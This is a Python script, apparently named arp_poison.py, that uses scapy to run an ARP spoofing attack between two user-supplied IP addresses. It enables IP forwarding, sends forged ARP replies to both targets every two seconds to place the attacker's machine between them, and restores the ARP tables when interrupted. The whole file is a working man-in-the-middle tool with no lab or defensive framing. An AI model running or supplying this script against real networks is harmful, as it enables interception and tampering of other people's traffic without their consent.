import scapy.all as scapy
import subprocess
import time
import optparse
import re


def user_input():
    parse_object = optparse.OptionParser(usage="Usage: python3 arp_poison.py -t [target_ip_1] -g [target_ip_2]")
    parse_object.add_option("-t", "--target1", dest="target_ip_1", help="First target ip")
    parse_object.add_option("-g", "--target2", dest="target_ip_2", help="Second target ip")
    user_input, _ = parse_object.parse_args()

    if not user_input.target_ip_1:
        print("Enter Target 1 IP:")
    if not user_input.target_ip_2:
        print("Enter Target 2 IP:")

    return user_input


def forward_check():
    output = (subprocess.check_output(["cat", "/proc/sys/net/ipv4/ip_forward"])).decode("utf-8")
    regex = re.search(r'\d',output)
    

    if regex[0] == '1':
        None
    else:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as file:
            file.write('1')

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=0, retry=3, iface="eth0")[0]
    
    return answered_list[0][1].hwsrc

def send_to_target(target_ip_1, target_ip_2):
    mac_addr = get_mac_address(target_ip_1)
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip_1, hwdst=mac_addr, psrc=target_ip_2)
    scapy.send(arp_response_packet, verbose=False)

def reset(target_ip1, target_ip2):
    t1_mac = get_mac_address(target_ip1)
    t2_mac = get_mac_address(target_ip2)
    arp_response = scapy.ARP(op=2, pdst=target_ip1, hwdst=t1_mac, psrc=target_ip2, hwsrc=t2_mac)
    scapy.send(arp_response, verbose=0, count=6)

if __name__ == "__main__":
    
    forward_check()
    number = 0

    user_ins = user_input()
    user_target1_ip = user_ins.target_ip_1
    user_target2_ip = user_ins.target_ip_2

    try:
        while True:
            send_to_target(user_target1_ip, user_target2_ip)
            send_to_target(user_target2_ip, user_target1_ip)
            print("\rSending Packets" + str(number * "."), end="")
            number += 1
            if number == 4:
                number = 0
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nThe program is terminating.")
        reset(user_target1_ip, user_target2_ip)
        reset(user_target2_ip, user_target1_ip)
